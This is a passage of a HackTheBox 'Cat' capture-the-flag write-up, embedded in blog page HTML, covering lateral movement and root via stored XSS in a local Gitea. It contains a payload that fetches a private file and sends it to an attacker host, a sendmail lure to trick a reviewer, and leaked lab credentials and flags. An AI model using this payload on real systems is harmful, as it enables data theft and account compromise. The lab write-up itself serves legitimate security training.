Gecko/20100101 Firefox/134.0\" 127.0.0.1 - - [05/Jul/2025:15:04:50 +0000] \"GET / HTTP/1.1\" 200 1436 \"http://cat.htb/join.php\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0\" copy The logs show a login attempt by user axel with a password. We check if axel is a system user.\n0xblivion@cat: ~ rosa@cat:~$ cat /etc/passwd | grep sh$ root:x:0:0:root:/root:/bin/bash axel:x:1000:1000:axel:/home/axel:/bin/bash rosa:x:1001:1001:,,,:/home/rosa:/bin/bash git:x:114:119:Git Version Control,,,:/home/git:/bin/bash jobert:x:1002:1002:,,,:/home/jobert:/bin/bash copy User axel exists. We attempt to switch user to axel using the password found in the logs.\n0xblivion@cat: ~ rosa@cat:~$ su - axel Password: axel@cat:~$ cat user.txt fa36b2c0a19c890b16baae817657e4b8 copy User flag: fa36b2c0a19c890b16baae817657e4b8 Privilege Escalation to Root From the /etc/passwd file, we noticed a git user, which suggests a local Git hosting service. We check the listening ports on the server.\n0xblivion@cat: ~ axel@cat:~$ ss -lntp State Recv-Q Send-Q Local Address:Port Peer Address:Port Process LISTEN 0 10 127.0.0.1:587 0.0.0.0:* LISTEN 0 37 127.0.0.1:55923 0.0.0.0:* LISTEN 0 4096 127.0.0.53%lo:53 0.0.0.0:* LISTEN 0 128 0.0.0.0:22 0.0.0.0:* LISTEN 0 1 127.0.0.1:36727 0.0.0.0:* LISTEN 0 128 127.0.0.1:48983 0.0.0.0:* LISTEN 0 4096 127.0.0.1:3000 0.0.0.0:* LISTEN 0 10 127.0.0.1:25 0.0.0.0:* LISTEN 0 511 *:80 *:* LISTEN 0 128 [::]:22 [::]:* copy Port 3000 is listening locally, which is a common port for Gitea. Port 25 (SMTP) is also open. When we SSH as axel, we notice a mail notification.\n0xblivion@cat: ~ root@localhost:~# ssh axel@cat.htb axel@cat.htb's password: Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-204-generic x86_64) ...SNIP... You have mail. Last login: Fri Jan 31 11:31:57 2025 from 10.10.14.69 axel@cat:~$ copy Reading axel’s mail reveals details about an internal Gitea service running on localhost:3000.\n0xblivion@cat: ~ axel@cat:~$ cat /var/mail/axel From rosa@cat.htb Sat Sep 28 04:51:50 2024 Return-Path: Received: from cat.htb (localhost [127.0.0.1]) by cat.htb (8.15.2/8.15.2/Debian-18) with ESMTP id 48S4pnXk001592 for ; Sat, 28 Sep 2024 04:51:50 GMT Received: (from rosa@localhost) by cat.htb (8.15.2/8.15.2/Submit) id 48S4pnlT001591 for axel@localhost; Sat, 28 Sep 2024 04:51:49 GMT Date: Sat, 28 Sep 2024 04:51:49 GMT From: rosa@cat.htb Message-Id: \u003c202409280451.48S4pnlT001591@cat.htb\u003e Subject: New cat services Hi Axel, We are planning to launch new cat-related web services, including a cat care website and other projects. Please send an email to jobert@localhost with information about your Gitea repository. Jobert will check if it is a promising service that we can develop. Important note: Be sure to include a clear description of the idea so that I can understand it properly. I will review the whole repository. From rosa@cat.htb Sat Sep 28 05:05:28 2024 Return-Path: Received: from cat.htb (localhost [127.0.0.1]) by cat.htb (8.15.2/8.15.2/Debian-18) with ESMTP id 48S55SRY002268 for ; Sat, 28 Sep 2024 05:05:28 GMT Received: (from rosa@localhost) by cat.htb (8.15.2/8.15.2/Submit) id 48S55Sm0002267 for axel@localhost; Sat, 28 Sep 2024 05:05:28 GMT Date: Sat, 28 Sep 2024 05:05:28 GMT From: rosa@cat.htb Message-Id: \u003c202409280505.48S55Sm0002267@cat.htb\u003e Subject: Employee management We are currently developing an employee management system. Each sector administrator will be assigned a specific role, while each employee will be able to consult their assigned tasks. The project is still under development and is hosted in our private Gitea. You can visit the repository at: http://localhost:3000/administrator/Employee-management/. In addition, you can consult the README file, highlighting updates and other important details, at: http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md. copy The mail indicates that jobert@localhost will review a Gitea repository, and provides a link to an “Employee management” repository: http://localhost:3000/administrator/Employee-management/.\nWe forward port 3000 from the target to our local machine via SSH.\n0xblivion@cat: ~ root@localhost:~# ssh -L 3000:127.0.0.1:3000 axel@cat.htb axel@cat.htb's password: Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-204-generic x86_64) ...SNIP... copy Now, we can access http://localhost:3000 in our browser. The Gitea instance shows three users when exploring.\nLogging in as axel with his password, we notice the Gitea version is 1.22.0 in the footer.\nSearching for exploits for Gitea 1.22.0, we find a Stored XSS vulnerability.\nThe XSS vulnerability can be exploited by injecting a payload into the repository description. We aim to extract the index.php file from the Employee-management repository, as the email suggested jobert would review the repository.\nWe craft an XSS payload to fetch the content of http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php and send it to our local web server.\n\u003ca href=\"javascript:fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php').then(r=\u003er.text()).then(d=\u003efetch('http://10.10.15.7:1234/?x='+encodeURIComponent(d)))\"\u003eClick\u003c/a\u003e We create a new repository in Gitea (e.g., HALLO) and paste the XSS payload into the Description field, ensuring “Initialize this repository with a README.md” is checked.\nNext, we send an email to jobert@localhost with a link to our malicious repository, knowing that jobert will likely click it to review.\n0xblivion@cat: ~ axel@cat:~$ echo -e \"Subject: Hello, click here http://localhost:3000/axel/HALLO\" | sendmail jobert@localhost copy On our Python web server (listening on port 1234), we receive the exfiltrated index.php content.\n0xblivion@cat: ~ root@localhost:~# python3 -m http.server 1234 Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ... 10.10.11.53 - - [05/Jul/2025 12:10:15] \"GET /?x=%3C%3Fphp%0A%24valid_username%20%3D%20%27admin%27%3B%0A%24valid_password%20%3D%20%27IKw75eR0MR7CMIxhH0%27%3B%0A%0Aif%20(!isset(%24_SERVER%5B%27PHP_AUTH_USER%27%5D)%20%7C%7C%20!isset(%24_SERVER%5B%27PHP_AUTH_PW%27%5D)%20%7C%7C%20%0A%20%20%20%20%24_SERVER%5B%27PHP_AUTH_USER%27%5D%20!%3D%20%24valid_username%20%7C%7C%20%24_SERVER%5B%27PHP_AUTH_PW%27%5D%20!%3D%20%24valid_password)%20%7B%0A%20%20%20%20%0A%20%20%20%20header(%27WWW-Authenticate%3A%20Basic%20realm%3D%22Employee%20Management%22%27)%3B%0A%20%20%20%20header(%27HTTP%2F1.0%20401%20Unauthorized%27)%3B%0A%20%20%20%20exit%3B%0A%7D%0A%0Aheader(%27Location%3A%20dashboard.php%27)%3B%0Aexit%3B%0A%3F%3E%0A%0A copy Decoding the URL-encoded content reveals the PHP source code for index.php:\n\u003c?php $valid_username = 'admin'; $valid_password = 'IKw75eR0MR7CMIxhH0'; if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW']) || $_SERVER['PHP_AUTH_USER'] != $valid_username || $_SERVER['PHP_AUTH_PW'] != $valid_password) { header('WWW-Authenticate: Basic realm=\"Employee Management\"'); header('HTTP/1.0 401 Unauthorized'); exit; } header('Location: dashboard.php'); exit; ?\u003e The code reveals credentials for an “Employee Management” system: admin:IKw75eR0MR7CMIxhH0. We attempt to switch user to root using this password.\n0xblivion@cat: ~ axel@cat:~$ su - root Password: root@cat:~# cat root.txt 11fad706f903f0c73a5c66aa2dbd4d2c copy Root flag: 11fad706f903f0f73a5c66aa2dbd4d2c ",
+  "wordCount" : "3615",
+  "inLanguage": "en",
+  "image":"https://0xblivion.dev/img/cat/og-cat.png","datePublished": "2025-07-05T00:00:00Z",
+  "dateModified": "2025-07-05T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "0xblivion"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://0xblivion.dev/posts/htb/linux/medium/hackthebox-cat-writeup/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "0xblivion.dev",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://0xblivion.dev/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://0xblivion.dev/" accesskey="h" title="0xblivion.dev (Alt + H)">0xblivion.dev</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://0xblivion.dev/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://0xblivion.dev/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://0xblivion.dev/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://0xblivion.dev/">Home</a>&nbsp;»&nbsp;<a href="https://0xblivion.dev/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      HackTheBox - Cat Writeup
+    </h1>
+    <div class="post-meta"><span title='2025-07-05 00:00:00 +0000 UTC'>July 5, 2025</span>&nbsp;·&nbsp;17 min&nbsp;·&nbsp;0xblivion
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#overview" aria-label="Overview">Overview</a></li>
+                <li>
+                    <a href="#1-kicking-off-with-nmap" aria-label="1. Kicking Off with Nmap">1. Kicking Off with Nmap</a></li>
+                <li>
+                    <a href="#2-gaining-initial-access" aria-label="2. Gaining Initial Access">2. Gaining Initial Access</a><ul>
+                        <ul>
+                        
+                <li>
+                    <a href="#footprinting--exploring-the-site" aria-label="Footprinting &amp; Exploring the Site">Footprinting &amp; Exploring the Site</a></li>
+                <li>
+                    <a href="#exploring-the-site" aria-label="Exploring the site:">Exploring the site:</a></li>
+                <li>
+                    <a href="#web-enumeration" aria-label="Web Enumeration">Web Enumeration</a></li>
+                <li>
+                    <a href="#subdomain-enumeration" aria-label="Subdomain Enumeration">Subdomain Enumeration</a></li>
+                <li>
+                    <a href="#dumping-git-using-git-dumper" aria-label="Dumping .git/ using git-dumper">Dumping .git/ using git-dumper</a></li>
+                <li>
+                    <a href="#exploiting-xss-to-get-admin-session" aria-label="Exploiting XSS to get Admin Session">Exploiting XSS to get Admin Session</a></li>
+                <li>
+                    <a href="#sql-injection" aria-label="SQL Injection">SQL Injection</a></li></ul>
+                    </ul>
+                </li>
+                <li>
+                    <a href="#user-flag" aria-label="User Flag">User Flag</a></li>
+                <li>
+                    <a href="#privilege-escalation-to-root" aria-label="Privilege Escalation to Root">Privilege Escalation to Root</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h1 id="overview">Overview<a hidden class="anchor" aria-hidden="true" href="#overview">#</a></h1>
+<img src="/img/cat/Cat.png" alt="Cat" class="img-responsive" loading="lazy" />
+<p>This box focuses on web application vulnerabilities, specifically Cross-Site Scripting (<code>XSS</code>) and <code>SQL Injection</code>, leading to privilege escalation. We start with an Nmap scan to identify open ports and services. We then enumerate the web application, discovering an exposed Git repository and an XSS vulnerability in the cat registration feature. Exploiting the XSS allows us to capture an admin session cookie, granting access to an administrative panel. From there, we identify and exploit a SQL Injection vulnerability to dump user credentials, which leads to SSH access as a low-privileged user. Finally, we leverage another XSS vulnerability within a local Gitea instance, triggered by an internal mail service, to compromise a higher-privileged user and obtain the root flag.</p>
+
+
+
+<div id="flowchart-1751931417978770826" class="attack-path-flowchart">
+  <div class="flowchart-controls">
+    <button class="zoom-btn" data-action="zoom-in" title="Zoom In">+</button>
+    <button class="zoom-btn" data-action="zoom-out" title="Zoom Out">−</button>
+    <button class="zoom-btn" data-action="reset" title="Reset View">⌂</button>
+  </div>
+  <div class="flowchart-data" style="display: none;">
+[https://i.ibb.co/JjzkJ3NR/user-removebg-preview.png]Nmap Scan  
+[https://i.ibb.co/HDPF8ZMm/website-removebg-preview-1.png]Access .git Directory  
+[https://i.ibb.co/Kckn13Nh/database-removebg-preview.png]Dump Source Code (config.php, contest.php)  
+[https://i.ibb.co/HDPF8ZMm/website-removebg-preview-1.png]Find XSS in Cat Registration  
+[https://i.ibb.co/ksTD4Kyw/bug-malicious-removebg-preview.png]Exploit XSS → Steal Admin Cookie  
+[https://i.ibb.co/Gwv4v4g/shell-exploit-removebg-preview.png]Access Admin Panel → SQL Injection  
+[https://i.ibb.co/0ybfPw9J/password-removebg-preview.png]Dump Users → Crack rosa Password  
+[https://i.ibb.co/JR4shsmH/login-removebg-preview.png]SSH as rosa  
+[https://i.ibb.co/JR4shsmH/login-removebg-preview.png]Read Apache Logs → Get axel Password  
+[https://i.ibb.co/JR4shsmH/login-removebg-preview.png]SSH as axel  
+[https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Access Gitea on localhost:3000  
+[https://i.ibb.co/ksTD4Kyw/bug-malicious-removebg-preview.png]Stored XSS in Repo Description  
+[https://i.ibb.co/Kckn13Nh/database-removebg-preview.png]Exfil index.php → Discover Root Creds  
+[https://i.ibb.co/679DN5x7/rooted-removebg-preview.png]SU to root → Capture Root Flag  
+</div>
+</div>
+
+
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" xintegrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/d3/7.8.5/d3.min.js" xintegrity="sha512-M1h0i4zB/nNoM+3TLA+q3EViN9yQ9LpIq6W2daLpZ1B13Y4YI3wE4F28M3aEfsyyHn5j2vAxw8U2tKjB6i/w==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  
+
+
+<style>
+.attack-path-flowchart {
+  width: 100%;
+  height: 500px;
+  background: transparent;
+  border: 1px solid rgba(255, 255, 255, 0.1);
+  border-radius: 8px;
+  position: relative;
+  overflow: hidden;
+  margin: 2rem 0;
+}
+
+.flowchart-controls {
+  position: absolute;
+  top: 10px;
+  right: 10px;
+  z-index: 1000;
+  display: flex;
+  gap: 5px;
+}
+
+.zoom-btn {
+  width: 32px;
+  height: 32px;
+  background: rgba(0, 0, 0, 0.7);
+  border: 1px solid rgba(255, 255, 255, 0.2);
+  border-radius: 4px;
+  color: #fff;
+  font-size: 16px;
+  font-weight: bold;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  transition: all 0.2s ease;
+}
+
+.zoom-btn:hover {
+  background: rgba(0, 0, 0, 0.9);
+  border-color: rgba(255, 255, 255, 0.4);
+}
+
+.flowchart-svg {
+  width: 100%;
+  height: 100%;
+  background: transparent;
+  cursor: grab;
+}
+
+.flowchart-svg:active {
+  cursor: grabbing;
+}
+
+.flowchart-node {
+  cursor: pointer;
+}
+
+.flowchart-icon {
+  font-family: 'Font Awesome 6 Free', 'Font Awesome 6 Solid', sans-serif;
+  font-weight: 900;
+  font-size: 36px;
+  text-anchor: middle;
+  dominant-baseline: central;
+  transition: all 0.3s ease;
+  filter: drop-shadow(0 2px 8px rgba(0, 0, 0, 0.6));
+}
+
+.flowchart-image {
+  transition: all 0.3s ease;
+  filter: drop-shadow(0 2px 8px rgba(0, 0, 0, 0.6));
+}
+
+.flowchart-text {
+  font-family: 'Courier New', 'Monaco', 'Consolas', monospace;
+  font-size: 10px;
+  font-weight: 600;
+  text-anchor: middle;
+  pointer-events: none;
+  user-select: none;
+  fill: #ddd;
+}
+
+.flowchart-arrow {
+  stroke: rgba(255, 255, 255, 0.4);
+  stroke-width: 1.5px;
+  transition: all 0.2s ease-in-out;
+}
+
+.flowchart-arrow.glow {
+  stroke: rgba(255, 255, 255, 1);
+  stroke-width: 2.5px;
+  filter: drop-shadow(0 0 4px rgba(255, 255, 255, 0.7));
+}
+
+.flowchart-arrow-marker {
+  fill: rgba(255, 255, 255, 0.6);
+}
+
+.flowchart-pin-icon {
+  font-family: 'Font Awesome 6 Free', 'Font Awesome 6 Solid', sans-serif;
+  font-weight: 900;
+  font-size: 16px;
+  fill: #DC143C;  
+  text-anchor: middle;
+  dominant-baseline: central;
+  display: none;  
+  pointer-events: none;
+  filter: drop-shadow(0 1px 2px rgba(0,0,0,0.7));
+}
+
+
+ 
+.node-recon .flowchart-icon { color: #A0522D; }  
+.node-enum .flowchart-icon { color: #4169E1; }  
+.node-exploit .flowchart-icon { color: #DC143C; }  
+.node-access .flowchart-icon { color: #2E8B57; }  
+.node-privesc .flowchart-icon { color: #FF8C00; }  
+.node-root .flowchart-icon { color: #FFD700; }  
+.node-default .flowchart-icon { color: #A9A9A9; }  
+</style>
+
+<script>
+(function() {
+  
+  "use strict";
+
+  let flowchartInstances = {};
+
+  const iconMap = {
+    recon: '\uf002', enum: '\uf0ca', exploit: '\uf1e2',
+    access: '\uf084', privesc: '\uf21b', root: '\uf624', default: '\uf059',
+    pin: '\uf08d',
+  };
+
+  function initFlowcharts() {
+    const containers = document.querySelectorAll('.attack-path-flowchart');
+    containers.forEach(container => {
+      if (container.dataset.initialized) return;
+      container.dataset.initialized = 'true';
+
+      const id = container.id;
+      const dataDiv = container.querySelector('.flowchart-data');
+      if (dataDiv) {
+        const steps = parseSteps(dataDiv.textContent);
+        if (steps.length > 0) {
+          flowchartInstances[id] = createInteractiveFlowchart(container, steps);
+          setupControls(container, id);
+        }
+      }
+    });
+  }
+
+  function setupControls(container, id) {
+    const instance = flowchartInstances[id];
+    if (!instance) return;
+    container.querySelectorAll('.zoom-btn').forEach(btn => {
+      btn.addEventListener('click', () => {
+        const action = btn.getAttribute('data-action');
+        if (action === 'zoom-in') {
+            instance.svg.transition().ease(d3.easeCubicOut).duration(500).call(instance.zoom.scaleBy, 1.2);
+        } else if (action === 'zoom-out') {
+            instance.svg.transition().ease(d3.easeCubicOut).duration(500).call(instance.zoom.scaleBy, 1 / 1.2);
+        } else if (action === 'reset') {
+          instance.svg.transition().ease(d3.easeCubicOut).duration(750).call(instance.zoom.transform, d3.zoomIdentity);
+        }
+      });
+    });
+  }
+
+  function parseSteps(content) {
+    return content.split('\n').map(l => l.trim()).filter(Boolean).map((line, idx) => {
+      line = line.replace(/^[-*]\s*/, '');
+      const imgRe = /\[\s*([^\]]+?)\s*\]\s*(.*)/;
+      const match = line.match(imgRe);
+      const text = match ? match[2].trim() : line;
+      return { id: idx, text, type: getStepType(text), imageUrl: match ? match[1] : null, pinned: false };
+    });
+  }
+
+  function getStepType(text) {
+    const l = text.toLowerCase();
+    if (l.includes('nmap') || l.includes('scan') || l.includes('recon')) return 'recon';
+    if (l.includes('enum') || l.includes('directory') || l.includes('subdomain') || l.includes('git') || l.includes('dump') || l.includes('crawl')) return 'enum';
+    if (l.includes('exploit') || l.includes('rce') || l.includes('sqli') || l.includes('xss') || l.includes('lfi') || l.includes('upload') || l.includes('injection')) return 'exploit';
+    if (l.includes('shell') || l.includes('reverse') || l.includes('bind') || l.includes('webshell')) return 'access';
+    if (l.includes('privesc') || l.includes('privilege') || l.includes('escalation') || l.includes('sudo') || l.includes('suid') || l.includes('kernel') || l.includes('creds')) return 'privesc';
+    if (l.includes('root') || l.includes('administrator') || l.includes('system') || l.includes('sudo bee')) return 'root';
+    return 'default';
+  }
+
+  function createInteractiveFlowchart(container, nodesData) {
+    const W = container.clientWidth, H = container.clientHeight;
+    const svg = d3.select(container).append('svg')
+                  .attr('class','flowchart-svg').attr('width',W).attr('height',H);
+
+    const zoom = d3.zoom().duration(500).scaleExtent([0.1, 5]).on('zoom', e => g.attr('transform', e.transform));
+
+    svg.call(zoom);
+    const g = svg.append('g');
+
+    const defs = svg.append('defs');
+    defs.append('marker')
+        .attr('id','arrowhead').attr('viewBox','-0 -5 10 10')
+        .attr('refX', 25).attr('refY', 0)
+        .attr('orient','auto').attr('markerWidth', 5).attr('markerHeight', 5)
+      .append('path').attr('d', 'M0,-5L10,0L0,5').attr('class','flowchart-arrow-marker');
+
+    const links = nodesData.length > 1 ? d3.range(nodesData.length - 1).map(i => ({ source: nodesData[i], target: nodesData[i+1] })) : [];
+
+    const arrows = g.append("g").selectAll("line")
+      .data(links).enter().append("line")
+      .attr("class", "flowchart-arrow")
+      .attr("marker-end", "url(#arrowhead)");
+
+    const nodeGroups = g.append("g").selectAll(".flowchart-node")
+      .data(nodesData, d => d.id).enter().append("g")
+      .attr("class", d => 'flowchart-node node-' + d.type);
+
+    nodeGroups.each(function(d) {
+      const node = d3.select(this);
+      if (d.imageUrl) {
+        node.append('image')
+          .attr('href', d.imageUrl).attr('class', 'flowchart-image')
+          .attr('x', -20).attr('y', -25).attr('width', 40).attr('height', 40)
+          .on('error', function() {
+            d3.select(this.parentNode).append('text').attr('class', 'flowchart-icon').attr('y', -5).text(iconMap['default']);
+            d3.select(this).remove();
+          });
+      } else {
+        node.append('text').attr('class', 'flowchart-icon').attr('y', -5).text(iconMap[d.type] || iconMap['default']);
+      }
+    });
+
+    nodeGroups.append('text')
+      .attr('class', 'flowchart-pin-icon')
+      .attr('x', 20)
+      .attr('y', -20)
+      .text(iconMap.pin);
+
+    nodeGroups.append('text').attr('class', 'flowchart-text').attr('y', 35)
+      .each(function(d) { wrapText(d3.select(this), d.text, 100); });
+    nodeGroups.append('title').text(d => d.text);
+
+    const numNodes = nodesData.length;
+    const padding = 120;
+    const nodeRadius = 40;
+
+    const linkForce = d3.forceLink(links).id(d => d.id).distance(150).strength(0.2);
+
+    const simulation = d3.forceSimulation(nodesData)
+        .force("link", linkForce)
+        .force("charge", d3.forceManyBody().strength(-600))
+        .force("collide", d3.forceCollide().radius(nodeRadius).strength(1))
+        .force("x", d3.forceX(d => {
+            if (numNodes <= 1) return W / 2;
+            return padding + (d.id / (numNodes - 1)) * (W - 2 * padding);
+        }).strength(0.4))
+        .force("y", d3.forceY(d => {
+            if (numNodes <= 1) return H / 2;
+            const amplitude = H * 0.20;
+            const frequency = Math.PI;
+            const centerY = H / 2;
+            const phase = (d.id / (numNodes - 1)) * frequency;
+            return centerY - amplitude * Math.cos(phase);
+        }).strength(0.5))
+        .on("tick", () => {
+          arrows
+              .attr("x1", d => d.source.x)
+              .attr("y1", d => d.source.y)
+              .attr("x2", d => d.target.x)
+              .attr("y2", d => d.target.y);
+          nodeGroups
+              .attr("transform", d => `translate(${d.x},${d.y})`);
+        });
+
+    const dragHandler = d3.drag()
+        .on("start", function (event, d) {
+            if (!event.active) simulation.alphaTarget(0.3).restart();
+            d.fx = d.x;
+            d.fy = d.y;
+            
+            arrows.filter(link => link.source.id === d.id).classed('glow', true);
+            linkForce.strength(0); 
+        })
+        .on("drag", function (event, d) {
+            d.fx = event.x;
+            d.fy = event.y;
+        })
+        .on("end", function (event, d) {
+            if (!event.active) simulation.alphaTarget(0);
+            
+            linkForce.strength(0.2); 
+            
+            arrows.filter(link => link.source.id === d.id).classed('glow', false);
+
+            d.pinned = true;
+            d3.select(this).select('.flowchart-pin-icon').style('display', 'block');
+        });
+
+    nodeGroups
+      .call(dragHandler)
+      .on('mouseover', (event, d) => {
+        
+        arrows.filter(link => link.source.id === d.id).classed('glow', true);
+      })
+      .on('mouseout', (event, d) => {
+        
+        arrows.filter(link => link.source.id === d.id).classed('glow', false);
+      })
+      .on('contextmenu', function(event, d) {
+        event.preventDefault();
+        
+        if (d.pinned) {
+          d.pinned = false;
+          d.fx = null; 
+          d.fy = null;
+          d3.select(this).select('.flowchart-pin-icon').style('display', 'none');
+          simulation.alpha(0.3).restart(); 
+        }
+      });
+
+    return { svg, zoom, g };
+  }
+
+  function wrapText(textElem, str, maxW) {
+    const words = str.split(/\s+/), lineHeight = 12, x = 0;
+    textElem.text(null);
+    let line = [], tspan = textElem.append('tspan').attr('x', x);
+    for (const word of words) {
+        line.push(word);
+        tspan.text(line.join(' '));
+        if (tspan.node().getComputedTextLength() > maxW && line.length > 1) {
+            line.pop();
+            tspan.text(line.join(' '));
+            line = [word];
+            tspan = textElem.append('tspan').attr('x', x).attr('dy', `${lineHeight}px`).text(word);
+        }
+    }
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initFlowcharts);
+  } else {
+    initFlowcharts();
+  }
+})();
+</script>
+
+
+<div class="target-info">
+    <div class="target-icon">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <circle cx="12" cy="12" r="10"/>
+            <circle cx="12" cy="12" r="6"/>
+            <circle cx="12" cy="12" r="2"/>
+        </svg>
+    </div>
+    <div class="target-details">
+        <div class="target-item">
+            <span class="target-label">Target IP</span>
+            <code class="ip-address">10.10.11.53</code>
+        </div>
+        
+    </div>
+</div>
+
+<style>
+.target-info {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    padding: 12px 16px;
+    margin: 16px 0;
+    background: linear-gradient(135deg, #0d1117 0%, #161b22 100%);
+    border-left: 4px solid #9fef00;
+    border-radius: 8px;
+    font-family: system-ui, -apple-system, sans-serif;
+}
+
+.target-icon {
+    flex-shrink: 0;
+}
+
+.target-icon svg {
+    width: 20px;
+    height: 20px;
+    color: #9fef00;
+    display: block;
+}
+
+.target-details {
+    flex: 1;
+    display: flex;
+    align-items: center;
+    gap: 16px;
+}
+
+.target-item {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+}
+
+.creds-separator {
+    flex-shrink: 0;
+    opacity: 1;
+}
+
+.creds-separator svg {
+    width: 18px;
+    height: 18px;
+    color: #9fef00;
+    display: block;
+    stroke-width: 2.5;
+}
+
+.target-label {
+    font-size: 14px;
+    font-weight: 600;
+    color: #c9d1d9;
+    white-space: nowrap;
+}
+
+.ip-address, .credentials {
+    color: #9fef00;
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    font-weight: bold;
+    background: none !important;
+    background-color: transparent !important;
+    padding: 0 !important;
+    border: none !important;
+    border-radius: 0 !important;
+}
+</style>
+
+
+<hr>
+<h1 id="1-kicking-off-with-nmap">1. Kicking Off with Nmap<a hidden class="anchor" aria-hidden="true" href="#1-kicking-off-with-nmap">#</a></h1>
+<p>As always, we start with an <code>nmap</code> scan to see what services are running on the target.</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@cat: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">sudo</span> nmap <span class="flag">-sVC</span> <span class="flag">-oA</span> nmap/cat 10.10.11.53 <span class="flag">-vv</span>
+Nmap 7.95 scan initiated Thu Jul  3 22:46:57 2025 as: /usr/lib/nmap/nmap <span class="flag">-sVC</span> <span class="flag">-oA</span> nmap/cat <span class="flag">-vv</span> 10.10.11.53
+Nmap scan report for 10.10.11.53
+Host is up, received echo-reply ttl 63 (0.055s latency).
+Scanned at 2025-07-03 22:46:57 EDT for 9s
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 96:2d:f5:c6:f6:9f:59:60:e5:65:85:ab:49:e4:76:14 (RSA)
